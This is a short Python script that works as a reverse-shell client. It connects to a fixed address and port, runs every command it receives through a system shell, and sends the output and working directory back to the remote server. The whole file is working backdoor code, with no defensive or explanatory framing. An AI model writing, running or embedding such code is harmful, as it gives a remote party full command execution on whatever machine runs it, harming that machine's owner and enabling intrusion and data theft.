import os
import socket
import subprocess


host = '192.168.0.10'
port = 9997
theSocket = socket.socket()
theSocket.connect((host, port))

# listen for commands from the server

while True:
    data = theSocket.recv(1024)
    if data[:2].decode("utf-8") == 'cd':   # no output when cd
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        command = subprocess.Popen(data[:].decode("utf-8"),
                                   shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
        output_bytes = command.stdout.read() + command.stderr.read()
        output_str = str(output_bytes, "utf-8")
        theSocket.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str)

# close the connection
theSocket.close()